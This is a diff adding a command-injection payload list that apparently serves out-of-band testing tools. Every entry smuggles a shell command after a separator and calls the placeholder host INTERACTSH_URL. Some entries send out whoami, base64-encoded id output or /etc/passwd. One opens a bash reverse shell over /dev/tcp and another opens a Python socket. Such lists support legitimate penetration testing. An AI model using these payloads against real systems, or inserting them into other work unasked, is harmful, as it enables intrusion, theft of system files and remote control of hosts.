@@ -1,0 +1,25 @@
+test;nslookup INTERACTSH_URL
+test;nslookup `whoami`.INTERACTSH_URL
+test;ping -c 1 INTERACTSH_URL
+test;curl http://INTERACTSH_URL/
+test;wget -q -O /dev/null http://INTERACTSH_URL/
+test|curl http://INTERACTSH_URL/`whoami`
+test;curl http://INTERACTSH_URL/?c=`id|base64`
+test;curl http://INTERACTSH_URL/?c=$(id|base64 -w 0)
+test;dig INTERACTSH_URL
+test;host INTERACTSH_URL
+test;curl -X POST http://INTERACTSH_URL/ -d "$(id)"
+test;wget http://$(id|base64).INTERACTSH_URL
+test;curl http://INTERACTSH_URL/$(cat /etc/passwd|base64)
+test`curl http://INTERACTSH_URL`
+test$(curl http://INTERACTSH_URL)
+test;bash -i >& /dev/tcp/INTERACTSH_URL/443 0>&1
+test&curl http://INTERACTSH_URL/
+test|curl http://INTERACTSH_URL/
+test&&curl http://INTERACTSH_URL/
+test||curl http://INTERACTSH_URL/
+test\ncurl http://INTERACTSH_URL
+test%0acurl${IFS}http://INTERACTSH_URL/
+test;powershell -c "Invoke-WebRequest http://INTERACTSH_URL/"
+test&nslookup%20INTERACTSH_URL
+test;python3 -c "import socket;s=socket.socket();s.connect(('INTERACTSH_URL',80))"
